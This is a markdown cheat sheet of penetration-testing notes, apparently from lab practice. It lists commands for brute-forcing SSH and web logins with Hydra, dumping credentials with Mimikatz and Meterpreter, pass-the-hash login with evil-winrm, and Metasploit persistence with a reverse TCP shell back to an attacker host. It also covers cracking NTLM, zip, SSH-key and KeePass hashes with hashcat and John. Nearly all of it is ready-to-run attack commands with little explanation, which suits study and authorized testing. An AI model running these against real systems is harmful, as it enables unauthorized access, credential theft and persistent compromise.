# Cracking Passowrds Online

## Bruteforce Attacks

A brute force attack is a trial and error method used to decode sensitive data by systematically trying all possible combinations of passwords or encryption keys until the correct one is found .

## Types of Passwords Attacks 

* Simple brute force attacks trying all possible combinations.
* Dictionary attacks using common words and phrases.
* Hybrid attacks usingcommon words and phrases.
* Credential stuffing using exposed credentials from data breaches .
 
 ## Hydra tool

 ``` bash
 hydra -l username -P /usr/share/wordlists/rockyou.txt ssh://10.10.217.225
 hydra -l username -P /usr/share/wordlists/rockyou.txt 10.10.217.225 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect" -v

***To get access through SSH***

```
ssh CONTROLLER\\ADMINISTRATOR@10.10.8.116
ssh DomainName\\Username@IpAddr
```

## Mimikatz

To run mimkatz you should be the administrator of the system

```
mimikatz.exe
privilege::debug // Privilege '20' OK
lsadump::lsa /patch
```

Further we can crack the dumped password and use for further access . We can also access the compromised machine by NTLM hash without cracking with evil-winrm tool

``` bash
evil-winrm -i 10.10.8.116 -u Administrator -H 2777be78fwbhkwyuwioedhwebee6
```

*We can also maintain access with meterpreter shell*

``` meterpreter
hashdump
getuid // NT AUTHORITY\SYSTEM (`Which is highest level of authority over system which is neccesary for using mimikatz`)
load kiwi
```

## Maintaining persistence in Compromised system

```
> background
session -l
session -i 1 
> background
use exploit/windows/local/persistence
> options
> set LPORT 4499
> set SESSION 1 
> run
> set STARTUP SYSTEM
> back 

use exploit/multi/handler
> set payload windows/meterpreter/reverse_tcp
> set LHOST 192.168.29.160
> set LPORT 4499
> exploit
```

# Cracking Passwords Offline

## What is Hash ?
Hashing converts data of any size into a fixed-length string , called hash value , using a hash function . 
Even slight change in input produce drastic change in hash value . Its widely used for data integrety , idexing and security .

## Hashcat (GPU) & John the Ripper (CPU)

``` bash
hashcat -h | grep ntlm // gives mode ntlm hash
hashcat -a 0 -m 1000 hash.txt /usr/share/worklists/rockyou.txt

john hash.txt
john hash.txt --format=NT --wordlist=/usr/share/wordlists/rockyou.txt
zip2john confidential.zip > hash.txt
john hash.txt --wordlist=rockyou.txt
ssh2john id_rsa > hash.txt
john hash.txt --wordlist=rockyou.txt
keepass2john pass.kdbx > hash.txt

